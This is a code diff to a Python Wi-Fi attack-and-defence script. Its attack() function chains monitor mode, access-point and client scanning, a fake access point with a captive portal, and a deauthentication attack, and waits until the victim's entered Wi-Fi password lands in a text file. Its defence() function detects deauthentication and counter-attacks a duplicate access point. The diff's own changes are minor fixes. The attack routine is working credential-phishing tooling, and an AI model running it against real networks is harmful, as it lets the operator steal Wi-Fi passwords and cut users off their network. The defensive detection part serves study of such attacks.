@@ -15,21 +15,21 @@ P = '\033[35m'  # purple
 
 
 def attack():
-    # step 1 choose an interface and activate monitor mode
+    # step 1 chose an interface and activate monitor mode.
     interface = aph.choose_interface(1)
     aph.activate_monitor(interface)
-    # step 2 scan all the access point around and choose one
+    # step 2 scan all the access point nearby and choose one.
     ap = aph.APs_scanner(interface)  # [essid, bssid, channel] = [name, mac address, channel]
-    # step 3 choose a device that connect to the chosen access point
+    # step 3 choose a device that's connected to the chosen access point.
     device = aph.devices_scanner(interface, ap)  # mac address
 
     # step 4 activate captive portal
     hotspot_iface = aph.choose_interface(2)
     fap.reset_setting(hotspot_iface)
     fap.fake_AP_setup(hotspot_iface)
-    fap.hostapd_conf(hotspot_iface, "ap[0]")
+    fap.hostapd_conf(hotspot_iface, ap[0])
     fap.dnsmasq_conf(hotspot_iface)
-    fap.run_fake_ap("ap[0]")
+    fap.run_fake_ap(ap[0])
 
     # step 5 start deauthentication attack
     deauth.deauth_initial(True)
@@ -46,6 +46,7 @@ def attack():
         except:
             flag = 0
         time.sleep(5)
+
     print(P + "\n*** Target has entered a password you can watch it  at captive_portal/password.txt ***\n" + W)
 
     fap.remove_conf_files()
@@ -57,13 +58,13 @@ def attack():
 
 
 def defence():
-    # step 1 choose an interface and activate monitor mode
+    # step 1 chose an interface and activate monitor mode.
     interface = aph.choose_interface(1)
     aph.activate_monitor(interface)
-    # step 2 scan all the access point around and choose one to protect
+    # step 2 scan all the access point nearby and choose one to defend.
     ap = aph.APs_scanner(interface, 1)  # [essid, bssid, channel] = [name, mac address, channel]
     # step 3: Sniffing the packets and checking for attack.
-    attack_detected = df.deauth_detector(interface, ap)
+    attack_detected = df.deauth_detector(interface, ap, False)
     if attack_detected:
         # step 4 search for malicious AP
         mal_ap = df.APs_scan_duplications(interface=interface, ap=ap)
@@ -72,7 +73,7 @@ def defence():
         deauthAttack = threading.Thread(target=deauth.start, args=(interface, mal_ap[1]))
         deauthAttack.daemon = True
         deauthAttack.start()
-        time.sleep(520)
+        time.sleep(520) # about 8.5 min.
         deauth.deauth_initial(False)
         deauthAttack.join()
         aph.deactivate_monitor(interface)
